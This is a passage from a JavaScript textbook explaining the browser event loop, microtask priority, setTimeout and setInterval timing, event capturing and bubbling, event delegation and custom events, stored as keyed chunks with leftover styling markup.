13.1. pseudocode for our event loop demo with one task queue  <button id=\"firstbutton\"></button>  <button id=\"secondbutton\"></button>  <script>  const firstbutton = document.getelementbyid(\"firstbutton\");  const secondbutton = document.getelementbyid(\"secondbutton\");  firstbutton.addeventlistener(\"click\", function firsthandler(){  #a  /*some click handle code that runs for 8 ms*/  #a  });  secondbutton.addeventlistener(\"click\", function secondhandler(){  #b  /*click handle code that runs for 5ms*/  #b  });  /*code that runs for 15ms*/  </script>  #a - registers an event handler for a button-click event on the first button  #b - registers another click event handler, this time for the second button  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  this example requires some imagination, so instead of cluttering the code fragment with unnecessary code, we ask you to imagine the following:  our mainline javascript code takes 15 ms to execute.  the first click event handler runs for 8 ms.  the second click event handler runs for 5 ms.  now let's continue to be imaginative, and say that we have a super quick user who clicks the first button 5 ms after our script starts executing, and the second button 12 ms after. figure 13.2 depicts this situation.  figure 13.2. this timing diagram shows how events are added to the task queue as they occur. when a task is done executing, the event loop takes it off the queue, and continues by executing the next task.", "javascript-13.1.txt__13": "the program starts by executing mainline javascript code. immediately, two elements, firstbutton and secondbutton, are fetched from the dom, and two functions, firsthandler and secondhandler, are registered as click event handlers:  firstbutton.addeventlistener(\"click\", function firsthandler(){...});  secondbutton.addeventlistener(\"click\", function secondhandler(){...});  this is followed by code that executes for another 15 ms. during this execution, our quick user clicks firstbutton 5 ms after the program starts executing, and clicks secondbutton 12 ms after.", "javascript-13.1.txt__14": "if we take a snapshot of our task queue 12 ms into the execution of our script, we'll see the following three tasks:  evaluate mainline javascript code\u2014the currently executing task.  click firstbutton\u2014the event created when firstbutton is clicked.  click secondbutton\u2014the event created when secondbutton is clicked.  these tasks are also shown in figure 13.3.  figure 13.3. 12 ms into the application execution, the task queue has three tasks: one for evaluating mainline javascript code (the currently executing task), and one for each button-click event.", "javascript-13.1.txt__15": "next, the firstbutton click task starts its execution. figure 13.4 illustrates the task queue 15 ms into the application execution. the execution of firsthandler, associated with the firstbutton click, takes around 8 ms, and the handler is executed to its completion, without interruption, while the click event related to secondbutton is waiting in the queue.", "javascript-13.1.txt__16": "figure 13.4. the task queue 15 ms into application execution contains two tasks for click events. the first task is currently being executed.  next, at 23 ms, the firstbutton click event is fully processed, and the matching task is removed from the task queue. again, the browser checks the microtask queue, which is still empty, and re-renders the page, if necessary.  finally, in the third loop iteration, the secondbutton click event is being handled, as shown in figure 13.5. the secondhandler takes around 5 ms to execute, and after this is performed, the task queue is finally empty, at 28 ms.  figure 13.5. 23 ms after the application starts executing, only one task, handling the secondbutton click event, remains to be executed.", "javascript-13.1.txt__17": "now let's extend this code to include microtasks.  13.1.2. an example with both macro- and microtasks", "javascript-13.1.txt__18": "the following listing shows the modified code for this two-queue example.  listing 13.2. pseudocode for our event loop demo with two queues  <button id=\"firstbutton\"></button>  <button id=\"secondbutton\"></button>  <script>  const firstbutton = document.getelementbyid(\"firstbutton\");  const secondbutton = document.getelementbyid(\"secondbutton\");  firstbutton.addeventlistener(\"click\", function firsthandler(){  promise.resolve().then(() => {  #a  /*some promise handling code that runs for 4 ms*/  #a  });  #a  /*some click handle code that runs for 8 ms*/  });  secondbutton.addeventlistener(\"click\", function secondhandler(){  /*click handle code that runs for 5ms*/  });  /*code that runs for 15ms*/  </script>  #a - immediately resolves a promise and passes in a callback to the then method  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":6,\\\"ch\\\":71},{\\\"line\\\":6,\\\"ch\\\":73}],[{\\\"line\\\":7,\\\"ch\\\":71},{\\\"line\\\":7,\\\"ch\\\":73}],[{\\\"line\\\":8,\\\"ch\\\":71},{\\\"line\\\":8,\\\"ch\\\":73}],[{\\\"line\\\":19,\\\"ch\\\":0},{\\\"line\\\":19,\\\"ch\\\":2}],[{\\\"line\\\":19,\\\"ch\\\":0},{\\\"line\\\":19,\\\"ch\\\":79}]]\"}  !@%style%@!  in this example, we assume that the same actions occur as in the first example:  firstbutton is clicked after 5 ms.  secondbutton is clicked after 12 ms.  firsthandler handles the click event of firstbutton and runs for 8 ms.  secondhandler handles the click event of secondbutton and runs for 5 ms.", "javascript-13.1.txt__19": "to be honest, in this case, where we've created an immediately resolved promise, the javascript engine could immediately invoke the callback, because we already know that the promise is successfully resolved. but, for consistency sake, the javascript engine doesn't do this, and instead calls all promise callbacks asynchronously, after the rest of the firsthandler code (which runs for 8 ms) is done executing. it does this by creating a new microtask and pushing it onto the microtask queue. let's explore the timing diagram of this execution in figure 13.6.", "javascript-13.1.txt__20": "figure 13.6. if a microtask is queued in the microtask queue, it gets priority and is processed even if an older task is already waiting in the queue. in this case, the promise success microtask gets priority over the secondbutton click event task.", "javascript-13.1.txt__21": "the next interesting point in application execution happens at 15 ms, when mainline javascript execution ends. because a task has finished executing, the event loop checks the microtask queue, which is empty, and moves onto page rendering, if necessary. again, for simplicity sake, we don't include a rendering fragment in our timing diagram.", "javascript-13.1.txt__22": "in the next iteration of the event loop, the task associated with the firstbutton click is being processed:  firstbutton.addeventlistener(\"click\", function firsthandler(){  promise.resolve().then(() => {  /*some promise handling code that runs for 4ms*/  });  /*some click handle code that runs for 8ms*/  });", "javascript-13.1.txt__23": "figure 13.7. during the execution of the first click handler, a resolved promise is created. this queues up a promise success microtask in the microtask queue that will be executed as soon as possible, but without interrupting the currently running task.  we revisit the task queues again 23 ms into the application execution, after the firstbutton click has been completely handled and its task taken off the task queue.", "javascript-13.1.txt__24": "if we consider things like this, it would be only fair that the secondbutton click task gets handled first, but as we already mentioned, microtasks are smaller tasks that should be executed as soon as possible. microtasks have priority, and if you look back at figure 13.1, you'll see that every time a task is processed, the event loop first checks the microtask queue, with the goal of processing all microtasks before continuing on to either rendering or other tasks.", "javascript-13.1.txt__25": "for this reason, the promise success task is executed immediately after the firstbutton click, even with the \u201colder\u201d secondbutton click task still waiting in the task queue, as shown in figure 13.8.  figure 13.8. after a task gets executed, the event loop processes all tasks in the microtask queue. in this case, before moving to the secondbutton click task, the promise success task is handled.  there's one important point that we need to emphasize. after a macrotask gets executed, the event loop immediately moves onto handling the microtask queue, without allowing rendering until the microtask queue is empty. just take a look at the timing diagram in figure 13.9.  figure 13.9. a page can be re-rendered between two macrotasks (mainline javascript execution and first click handler), while it can't be rendered before a microtask is executed (before the promise handler).", "javascript-13.1.txt__26": "a render can also occur after a microtask, but only if no other microtasks are waiting in the microtask queue. in our example, after the promise handler occurs, but before the event loop moves onto the second click handler, the browser can re-render the page.", "javascript-13.2.txt__1": "13.2. taming timers: time-outs and intervals", "javascript-13.2.txt__2": "but first, we'll start by examining the functions we can use to construct and manipulate timers. the browser provides two methods for creating timers: settimeout and setinterval. the browser also provides two corresponding methods to clear (or remove) them: cleartimeout and clearinterval. all are methods of the window (global context) object. similarly to the event loop, timers aren't defined within javascript itself; instead they're provided by the host environment (such as the browser on the client, or node.js on the server). table 13.1 lists the methods for creating and clearing timers.", "javascript-13.2.txt__3": "table 13.1. javascript's timer-manipulation methods (methods of the global window object)  method  format  description  settimeout  id = settimeout(fn,delay)  initiates a timer that will execute the passed callback once after the specified delay has elapsed. a value that uniquely identifies the timer is returned.  cleartimeout  cleartimeout(id)  cancels (clears) the timer identified by the passed value if the timer hasn't yet fired.  setinterval  id = setinterval(fn,delay)  initiates a timer that will continually try to execute the passed callback at the specified delay interval, until canceled. a value that uniquely identifies the timer is returned.  clearinterval  clearinterval(id)  cancels (clears) the interval timer identified by the passed value.", "javascript-13.2.txt__4": "note  it's important to understand that a timer's delay isn't guaranteed. this has a great deal to do with the event loop, as we'll see in the next section.  13.2.1. timer execution within the event loop  you've already examined exactly what happens when an event occurs. but timers are different from standard events, so let's explore an example similar to the ones you've seen so far. the following listing shows the code used for this example.  listing 13.3. pseudocode for our time-out and interval demo  <button id=\"mybutton\"></button>  <script>  settimeout(function timeouthandler(){  #a  /*some timeout handle code that runs for 6ms*/  #a  }, 10);  #a  setinterval(function intervalhandler(){  #b  /*some interval handle code that runs for 8ms*/  #b  }, 10);  #b  const mybutton = document.getelementbyid(\"mybutton\");  mybutton.addeventlistener(\"click\", function clickhandler(){  #c  /*some click handle code that runs for 10ms*/  #c  });  #c  /*code that runs for 18ms*/  </script>  #a - registers a time-out that expires after 10 ms  #b - registers an interval that expires every 10 ms  #c - registers an event handler for a button-click event  !@%style%@!", "javascript-13.2.txt__5": "!@%style%@!  this time we have only one button, but we also register two timers. first, we register a time-out that expires after 10 ms:  settimeout(function timeouthandler(){  /*some timeout handler code that runs for 6ms*/  }, 10);  as a handler, that time-out has a function that takes 6 ms to execute. next, we also register an interval that expires every 10 ms:  setinterval(function intervalhandler(){  /*some interval handler code that runs for 8ms*/  }, 10);  the interval has a handler that takes 8 ms to execute. we continue by registering a button-click event handler that takes 10 ms to execute:  const mybutton = document.getelementbyid(\"mybutton\");  mybutton.addeventlistener(\"click\", function clickhandler(){  /*some click handler code that runs for 10ms*/  });  this example ends with a code block that runs for about 18 ms (again, humor us a bit and imagine some complex code here).  now, let's say we again have a quick and impatient user who clicks the button 6 ms into the application execution. figure 13.10 shows a timing diagram of the first 18 ms of execution.  figure 13.10. a timing diagram that shows 18 ms of execution in the example program. the first, currently running task is to evaluate mainline javascript code. it takes 18 ms to execute. during that execution, three events occur: a mouse click, a timer expiry, and an interval firing.  as in the previous examples, the first task in the queue is to execute mainline javascript code. during that execution, which roughly takes 18 ms to complete, three important things occur:  at 0 ms, a time-out timer is initiated with a 10 ms delay, and an interval timer is also initiated with a 10 ms delay. their references are kept by the browser.  at 6 ms, the mouse is clicked.  at 10 ms, the time-out timer expires and the first interval fires.", "javascript-13.2.txt__6": "the initial block of code completes executing after 18 ms, and because there are no microtasks in this execution, the browser can re-render the page (again, left out from our timing discussions, due to simplicity) and move onto the second iteration of the event loop. the state of the task queue at this time is shown in figure 13.11.", "javascript-13.2.txt__7": "figure 13.11. timer events are placed into the task queue as they expire.", "javascript-13.2.txt__8": "figure 13.12. if an interval event fires, and a task is already associated with that interval waiting in the queue, a new task isn't added. instead, nothing happens, as is shown for the queues at 20 ms and 30 ms.", "javascript-13.2.txt__9": "the click handler completes at 28 ms, and the browser is again allowed to re-render the page before the event loop goes into another iteration. in the next iteration of the event loop, at 28 ms, the time-out task is processed. but think back to the beginning of this example. we used the following function call to set a time-out that should expire after 10 ms:", "javascript-13.2.txt__10": "settimeout(function timeouthandler(){  /*some timeout handle code that runs for 6ms*/  }, 10);  because this is the first task in our application, it's not weird to expect that the time-out handler will be executed exactly after 10 ms. but as you see in figure 13.11, the time-out starts at the 28 ms mark!", "javascript-13.2.txt__11": "the time-out task takes 6 ms to execute, so it should be finished 34 ms into the application execution. during this time period, at 30 ms another interval fires, because we've scheduled it to be executed every 10 ms. once more, no additional task is queued, because a matching task for interval handler execution is already waiting in the queue. at 34 ms, the time-out handler finishes, and the browser again has a chance to re-render the page and enter another iteration of the event loop.", "javascript-13.2.txt__12": "finally, the interval handler starts its execution at 34 ms, 24 ms after the 10 ms mark at which it was added to the event queue. this again emphasizes that the delay we pass in as an argument to the functions settimeout(fn, delay) and setinterval(fn, delay) specifies only the delay after which the matching task is added to the queue, and not the exact time of execution.", "javascript-13.2.txt__13": "the interval handler takes 8 ms to execute, so while it's executing, another interval expires at the 40 ms mark. this time, because the interval handler is being executed (and not waiting in the queue), a new interval task is finally added to the task queue, and the execution of our application continues, as shown in figure 13.13. setting a setinterval delay to 10 ms doesn't mean that we'll end up with our handler executing every 10 ms. for example, because tasks are queued and the duration of a single task execution can vary, intervals can be executed one right after another, as is the case with intervals at the 42 and 50 ms marks.", "javascript-13.2.txt__14": "figure 13.13. because of the setbacks caused by the mouse click and time-out handler, it takes some time for the interval handlers to start executing every 10 ms.", "javascript-13.2.txt__15": "as we can see, intervals have special considerations that don't apply to time-outs. let's look at those more closely.  differences between time-outs and intervals  at first glance, an interval may look like a time-out that periodically repeats itself. but the differences run a little deeper. let's look at an example to better illustrate the differences between settimeout and setinterval:  settimeout(function repeatme(){  #a  /* some long block of code... */  #a  settimeout(repeatme, 10);  #a  }, 10);  #a  setinterval(() => {  #b  /* some long block of code... */  #b  }, 10);  #b  #a - sets up a time-out that reschedules itself every 10 milliseconds  #b - sets up an interval that triggers every 10 milliseconds  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-13.2.txt__16": "we know that the time-out callback is never guaranteed to execute exactly when it's fired. rather than being fired every 10 ms, as the interval is, it will reschedule itself for 10 ms after it gets around to executing.  all of this is incredibly important knowledge. knowing how a javascript engine handles asynchronous code, especially with the large number of asynchronous events that typically occur in the average page, creates a great foundation for building advanced pieces of application code.  with all that under our belts, let's see how our understanding of timers and the event loop can help avoid some performance pitfalls.  13.2.2. dealing with computationally expensive processing", "javascript-13.2.txt__17": "reducing all complex operations that take any more than a few hundred milliseconds into manageable portions becomes a necessity if we want to keep the interface responsive. additionally, most browsers will produce a dialog box warning the user that a script has become \u201cunresponsive\u201d if it has run nonstop for at least 5 seconds, while some other browsers will even silently kill any script running for more than 5 seconds.", "javascript-13.2.txt__18": "you may have been to a family reunion where a garrulous uncle won't stop talking and insists on telling the same stories over and over again. if no one else gets a chance to break in and get a word in edgewise, the conversation's not going to be pleasant for anyone (except for uncle bruce). likewise, code that hogs all the processing time results in an outcome that's less than desirable; producing an unresponsive user interface is never good. but situations will almost certainly arise that require us to process a significant amount of data, situations such as manipulating a couple of thousand dom elements, for example.", "javascript-13.2.txt__19": "on these occasions, timers can come to the rescue and become especially useful. because timers are capable of effectively suspending the execution of a piece of javascript until a later time, they can also break individual pieces of code into fragments that aren't long enough to cause the browser to hang. taking this into account, we can convert intensive loops and operations into nonblocking operations.", "javascript-13.2.txt__20": "let's look at the following example of a task that's likely to take a long time.  listing 13.4. a long-running task  <table><tbody></tbody></table>  <script>  const tbody = document.queryselector(\"tbody\");  #a  for (let i = 0; i < 20000; i++) {  #b  const tr = document.createelement(\"tr\");  #c  for (let t = 0; t < 6; t++) {  #d  const td = document.createelement(\"td\");  td.appendchild(document.createtextnode(i + \",\" + t));  tr.appendchild(td);  tbody.appendchild(tr);  #e  </script>  #a - finds the tbody element that we're going to create a boatload of rows for  #b - makes 20,000 rows, which should qualify as a \u201cboatload\u201d  #c - creates an individual row  #d - for each row, creates 6 cells, each with a text node  #e - attaches the new row to its parent  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-13.2.txt__21": "what we need to do is shut up uncle bruce at regular intervals so that other people can get a chance to join the conversation. in code, we can introduce timers to create just such \u201cbreaks in the conversation,\u201d as shown in the next listing.  listing 13.5. using a timer to break up a long-running task  const rowcount = 20000;  #a  const divideinto = 4;  const chunksize = rowcount/divideinto;  let iteration = 0;  const table = document.getelementsbytagname(\"tbody\")[0];  settimeout(function generaterows(){  const base = chunksize * iteration;  #b  for (let i = 0; i < chunksize; i++) {  const tr = document.createelement(\"tr\");  for (let t = 0; t < 6; t++) {  const td = document.createelement(\"td\");  td.appendchild(  document.createtextnode((i + base) + \",\" + t +  \",\" + iteration));  tr.appendchild(td);  table.appendchild(tr);  iteration++;  if (iteration < divideinto)  #c  settimeout(generaterows, 0);  #c  },0);  #d  #a - sets up the data  #b - computes where we left off last time  #c - schedules the next phase  #d - sets time-out delay to 0 to indicate that the next iteration should execute \u201cas soon as possible,\u201d but after the ui has been updated  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-13.2.txt__22": "figure 13.14. use timers to break long-running tasks into smaller tasks that won't clog the event loop.  also important to note is the little bit of math needed to keep track of where we left off in the previous iteration, base = chunksize * iteration, and how we automatically schedule the next iterations until we determine that we're done:  if (iteration < divideinto)  settimeout(generaterows, 0);", "javascript-13.2.txt__23": "note", "javascript-13.2.txt__24": "the most perceptible change resulting from this technique, from the user's perspective, is that a long browser hang is replaced with four (or however many we choose) visual updates of the page. although the browser will attempt to execute the code segments as quickly as possible, it will also render the dom changes after each step of the timer. in the original version of the code, it needed to wait for one large bulk update.", "javascript-13.3.txt__1": "13.3. working with events  when a certain event occurs, we can handle it in our code. as you've seen many times throughout this book, one common way of registering event handlers is by using the built-in addeventlistener method, as shown in the following listing.  listing 13.6. registering event handlers  <button id=\"mybutton\">click</button>  <script>  const mybutton = document.getelementbyid(\"mybutton\");  mybutton.addeventlistener(\"click\", function myhandler(event){  #a  assert(event.target === mybutton,  #b  \"the target of the event is also mybutton\");  #b  assert(this === mybutton,  #c  \"the handler is registered on mybutton\");  #c  });  </script>  #a - registers an event handler by using the addeventlistener method  #b - accesses the element that the event has occurred on through the target property of the passed-in event  #c - within the handler function, this refers to the element that has registered the handler.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in this snippet, we define a button named mybutton and register a click event handler by using the built-in addeventlistener method that's accessible from all elements.", "javascript-13.3.txt__2": "one of the properties of the passed-in event object is the target property, which references the element on which the event has occurred.  note", "javascript-13.3.txt__3": "before exploring this concept further, let's set the stage so you can see how events can be propagated through the dom.  13.3.1. propagating events through the dom", "javascript-13.3.txt__4": "listing 13.7. nested elements and click handlers  <html>  <head>  <style>  #outercontainer {width:100px; height:100px; background-color: blue;}  #innercontainer {width:50px; height:50px; background-color: red;}  </style>  </head>  <body>  <div id=\"outercontainer\">  #a  <div id=\"innercontainer\"></div>  #a  </div>  <script>  const outercontainer = document.getelementbyid(\"outercontainer\");  const innercontainer = document.getelementbyid(\"innercontainer\");  outercontainer.addeventlistener(\"click\", () => {  #b  report(\"outer container click\");  });  innercontainer.addeventlistener(\"click\", () => {  #c  report(\"inner container click\");  });  document.addeventlistener(\"click\", () => {  #d  report(\"document click\");  });  </script>  </body>  </html>  #a - creates two nested elements  #b - registers a click handler for the outer container  #c - registers a click handler for the inner container  #d - registers a click handler for the entire document  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  here we have two html elements, outercontainer and innercontainer, that are, like all the other html elements, contained within our global document. and on all three objects, we register a click handler.", "javascript-13.3.txt__5": "should we follow the order in which the events were registered? should we start with the element on which the event occurs and move upward? or should we start from the top and move downward toward the targeted element? back in the day, when browsers were first making these decisions, the two primary competitors, netscape and microsoft, made opposing choices.", "javascript-13.3.txt__6": "in netscape's event model, the event handling starts with the top element and trickles down to the event target element. in our case, the event handlers would be executed in the following order: document click handler, outercontainer click handler, and finally innercontainer click handler. this is called event capturing.", "javascript-13.3.txt__7": "microsoft chose to go the other way around: start from the targeted element and bubble up the dom tree. in our case, the events would be executed in the following order: innercontainer click handler, outercontainer click handler, and document click handler. this is called event bubbling.  the standard set by the w3 consortium (www.w3.org/tr/dom-level-3-events/), which is implemented by all modern browsers, embraces both approaches. an event is handled in two phases:  capturing phase\u2014 an event is first captured at the top element and trickled down to the target element.  bubbling phase\u2014 after the target element has been reached in the capturing phase, the event handling switches to bubbling, and the event bubbles up again from the target element to the top element.  these two phases are shown in figure 13.15.  figure 13.15. with capturing, the event trickles down to the target element. with bubbling, the event bubbles up from the target element.", "javascript-13.3.txt__8": "now let's go back to listing 13.7 and look closely at the way we've registered events:  outercontainer.addeventlistener(\"click\", () => {  report(\"outer container click\");  });  innercontainer.addeventlistener(\"click\", () => {  report(\"inner container click\");  });  document.addeventlistener(\"click\", () => {  report(\"document click\");  });", "javascript-13.3.txt__9": "let's modify the code in listing 13.7 in the following way.  listing 13.8. capturing versus bubbling  const outercontainer = document.getelementbyid(\"outercontainer\");  const innercontainer = document.getelementbyid(\"innercontainer\");  document.addeventlistener(\"click\", () => {  report(\"document click\");  });  #a  outercontainer.addeventlistener(\"click\", () => {  report(\"outer container click\");  }, true);  #b  innercontainer.addeventlistener(\"click\", () => {  report(\"inner container click\");  }, false);  #c  #a - by not specifying the third argument, the default, bubbling mode, is enabled.  #b - passing in true as the third argument enables capturing.  #c - passing in false enables bubbling.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":9,\\\"ch\\\":1},{\\\"line\\\":9,\\\"ch\\\":7}],[{\\\"line\\\":13,\\\"ch\\\":1},{\\\"line\\\":13,\\\"ch\\\":8}]]\"}  !@%style%@!", "javascript-13.3.txt__10": "as you know, a single event can trigger the execution of multiple event handlers, where each handler can be in either capturing or bubbling mode. for this reason, the event first goes through capturing, starting from the top element and trickling down to the event target element. when the target element is reached, bubbling mode is activated, and the event bubbles from the target element all the way back to the top.", "javascript-13.3.txt__11": "in our case, capturing starts from the top, window object and trickles down to the innercontainer element, with the goal of finding all elements that have an event handler for this click event in capturing mode. only one element, outercontainer, is found, and its matching click handler is executed as the first event handler.", "javascript-13.3.txt__12": "the event continues traveling down the capturing path, but no more event handlers with capturing are found. after the event reaches the event target element, the innercontainer element, the event moves on to the bubbling phase, where it goes from the target element all the way back to the top, executing all bubbling event handlers on that path.", "javascript-13.3.txt__13": "in our case, the innercontainer click handler will be executed as the second event handler, and the document click handler as the third. the output generated by clicking the innercontainer element, as well as the taken path, is shown in figure 13.16.  figure 13.16. first the event trickles down from the top, executing all event handlers in capturing mode. when the target element is reached, the event bubbles up to the top, executing all event handlers in bubbling mode.", "javascript-13.3.txt__14": "this takes us back to the this keyword in event handlers, and why we explicitly stated that the this keyword refers to the element on which the event handler is registered, and not necessarily to the element on which the event occurs.  again, let's modify our running example, as shown in the following listing.  listing 13.9. the difference between this and event.target in event handlers  const outercontainer = document.getelementbyid(\"outercontainer\");  const innercontainer = document.getelementbyid(\"innercontainer\");  innercontainer.addeventlistener(\"click\", function(event){  report(\"innercontainer handler\");  #a  assert(this === innercontainer,  #a  \"this referes to the innercontainer\");  #a  assert(event.target === innercontainer,  #a  \"event.target refers to the innercontainer\");  #a  });  outercontainer.addeventlistener(\"click\", function(event){  report(\"innercontainer handler\");  #b  assert(this === outercontainer,  #b  \"this refers to the outercontainer\");  #b  assert(event.target === innercontainer,  #b  \"event.target refers to the innercontainer\");  #b  });  #a - within the innercontainer handler, both this and event.target point to the innercontainer element.  #b - within the outercontainer handler, if we're handling the event originating on the innercontainer, this will refer to the outercontainer and event.target to innercontainer  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-13.3.txt__15": "assert(this === innercontainer,  \"this refers to the innercontainer\");  assert(event.target === innercontainer,  \"event.target refers to the innercontainer\");  the this keyword points to the innercontainer element because that's the element on which the current handler has been registered, whereas the event.target property points to the innercontainer element because that's the element on which the event has occurred.  next, the event bubbles up to the outercontainer handler. this time, the this keyword and the event.target point to different elements:  assert(this === outercontainer,  \"this refers to the outercontainer\");  assert(event.target === innercontainer,  \"event.target refers to the innercontainer\");  as expected, the this keyword refers to the outercontainer element, because this is the element on which the current handler has been registered. on the other hand, the event.target property points to the innercontainer element, because this is the element on which the event has occurred.  now that we understand how an event is propagated through the dom tree and how to access the element on which the event has originally occurred, let's see how to apply this knowledge to write less memory-intensive code.  delegating events to an ancestor", "javascript-13.3.txt__16": "const cells = document.queryselectorall('td');  for (let n = 0; n < cells.length; n++) {  cells[n].addeventlistener('click', function(){  this.style.backgroundcolor = 'yellow';  });  sure this works, but is it elegant? no. we're establishing the exact same event handler on potentially hundreds of elements, and they all do the exact same thing.  a much more elegant approach is to establish a single handler at a level higher than the cells that can handle all the events using event bubbling.  we know that all the cells will be descendants of their enclosing table, and we know that we can get a reference to the element that was clicked via event.target. it's much more suave to delegate the event handling to the table, as follows:  const table = document.getelementbyid('sometable');  table.addeventlistener('click', function(event){  if (event.target.tagname.tolowercase() === 'td')  #a  event.target.style.backgroundcolor = 'yellow';  });  #a - performs an action only if the click happens on a cell element (and not on a random descendant)  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":6,\\\"ch\\\":0},{\\\"line\\\":6,\\\"ch\\\":100}]]\"}  !@%style%@!  here, we establish one handler that easily handles the work of changing the background color for all cells in the table that were clicked. this is much more efficient and elegant.  with event delegation, we have to make sure that it's only applied to elements that are ancestors of the elements that are the event targets. that way, we're sure that the events will eventually bubble up to the element to which the handler has been delegated.  so far, we've been dealing with events that are provided by the browser, but haven't you ever fervently desired the ability to trigger your own custom events?  13.3.2. custom events", "javascript-13.3.txt__17": "loose coupling", "javascript-13.3.txt__18": "moreover, what if there are multiple things to do when the triggering condition occurs? making allowances for multiple notifications would be arduous and necessarily messy. these disadvantages are a result of close coupling, in which the code that detects the conditions has to know the details of the code that will react to that condition.", "javascript-13.3.txt__19": "loose coupling, on the other hand, occurs when the code that triggers the condition doesn't know anything about the code that will react to the condition, or even if there's anything that will react to it at all. one of the advantages of event handlers is that we can establish as many as we want, and these handlers are completely independent of each other. so event handling is a good example of loose coupling. when a button-click event is triggered, the code triggering the event has no knowledge of what handlers we've established on the page, or even if there are any. rather, the click event is pushed onto the task queue by the browser, and whatever caused the event to trigger could care less what happens after that. if handlers have been established for the click event, they'll eventually be individually invoked in a completely independent fashion.", "javascript-13.3.txt__20": "there's much to be said for loose coupling. in our scenario, the shared code, when it detects an interesting condition, triggers a signal of some sort that says, \u201cthis interesting thing has happened; anyone interested can deal with it,\u201d and it couldn't give a darn whether anyone's interested. let's examine a concrete example.", "javascript-13.3.txt__21": "an ajax-y example  let's pretend that we've written some shared code that will be performing an ajax request. the pages that this code will be used on want to be notified when an ajax request begins and when it ends; each page has its own things that it needs to do when these \u201cevents\u201d occur.", "javascript-13.3.txt__22": "consider this:  document.addeventlistener('ajax-start', e => {  document.getelementbyid('whirlything').style.display = 'inline-block';  });  document.addeventlistener('ajax-complete', e => {  document.getelementbyid('whirlything').style.display = 'none';  });  sadly, these events don't exist, but there's nothing stopping us from bringing them into existence.  creating custom events  custom events are a way of simulating (for the user of our shared code) the experience of a real event, but an event that has business sense within the context of our application. the following listing shows an example of triggering a custom event.  listing 13.10. using custom events  <style>  #whirlything { display: none; }  </style>  <button type=\"button\" id=\"clickme\">start</button>  #a  <img id=\"whirlything\" src=\"whirly-thing.gif\" />  #b  <script>  function triggerevent(target, eventtype, eventdetail){  const event = new customevent(eventtype, {  #c  detail: eventdetail  #d  });  target.dispatchevent(event);  #e  function performajaxoperation() {  #f  triggerevent(document, 'ajax-start', { url: 'my-url'});  #f  settimeout(() => {  #f  triggerevent(document, 'ajax-complete');  #f  },5000);  const button = document.getelementbyid('clickme');  button.addeventlistener('click', () => {  performajaxoperation();  #g  });  document.addeventlistener('ajax-start', e => {  #h  document.getelementbyid('whirlything').style.display = 'inline-block';  assert(e.detail.url === 'my-url', 'we can pass in event data');  #i  });  document.addeventlistener('ajax-complete', e => {  #j  document.getelementbyid('whirlything').style.display = 'none';  });  </script>  #a - a button that we'll click to simulate an ajax request  #b - our spinner image, which indicates loading, if shown  #c - uses the customevent constructor to create a new event  #d - passes in information to the event object through the detail property  #e - uses the built-in dispatchevent method to dispatch the event to the specified element  #f - mimics our ajax request with a timer. at the start of execution, triggers the ajax-start event. after enough time elapses, triggers the ajax-complete event. passes in a url as additional event data  #g - when a button is clicked, the ajax operation is started.  #h - handles the ajax-start event by showing our whirly thing  #i - checks that we can access additional event data  #j - handles the ajax-complete event by hiding our whirly thing  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in this example, we explore custom events by establishing the scenario described in the previous section: an animated pinwheel image is displayed while an ajax operation is underway. the operation is triggered by the click of a button.  in a completely decoupled fashion, a handler for a custom event named ajax-start is established, as is the one for the ajax-complete custom event. the handlers for these events show and hide the pinwheel image, respectively:  button.addeventlistener('click', () => {  performajaxoperation();  });  document.addeventlistener('ajax-start', e => {  document.getelementbyid('whirlything').style.display = 'inline-block';  assert(e.detail.url === 'my-url', 'we can pass in event data');  });  document.addeventlistener('ajax-complete', e => {  document.getelementbyid('whirlything').style.display = 'none';  });  note that the three handlers know nothing of each other's existence. in particular, the button click handler has no responsibilities with respect to showing and hiding the image.  the ajax operation itself is simulated with the following code:  function performajaxoperation() {  triggerevent(document, 'ajax-start', { url: 'my-url'});  settimeout(() => {  triggerevent(document, 'ajax-complete');  }, 5000);", "javascript-13.3.txt__23": "notice the high degree of decoupling throughout this example. the shared ajax operation code has no knowledge of what the page code is going to do when the events are triggered, or even if there's page code to trigger at all. the page code is modularized into small handlers that don't know about each other. furthermore, the page code has no idea how the shared code is doing its thing; it just reacts to events that may or may not be triggered.", "javascript-13.3.txt__24": "this level of decoupling helps to keep code modular, easier to write, and a lot easier to debug when something goes wrong. it also makes it easy to share portions of code and to move them around without fear of violating a coupled dependency between the code fragments. decoupling is a fundamental advantage when using custom events in code, and it allows us to develop applications in a much more expressive and flexible manner.", "javascript-14.1.txt__1": "14.1. cross-browser considerations", "javascript-14.1.txt__2": "in a perfect world, all browsers would be bug-free and would support web standards consistently, but as we all know, we don't live in that world. although the quality of browsers has improved greatly as of late, all still have some bugs, missing apis, and browser-specific quirks that we'll need to deal with. developing a comprehensive strategy for tackling these browser issues, and becoming intimately familiar with their differences and quirks, isn't less important than proficiency in javascript itself.", "javascript-14.1.txt__3": "when writing browser applications, choosing which browsers to support is important. we'd probably like to support them all, but limitations on development and testing resources dictate otherwise. so how do we decide which to support, and to what level?", "javascript-14.1.txt__4": "table 14.1. a hypothetical browser-support matrix  windows  os x  linux  ios  android  ie 9  n/a  n/a  n/a  n/a  ie10  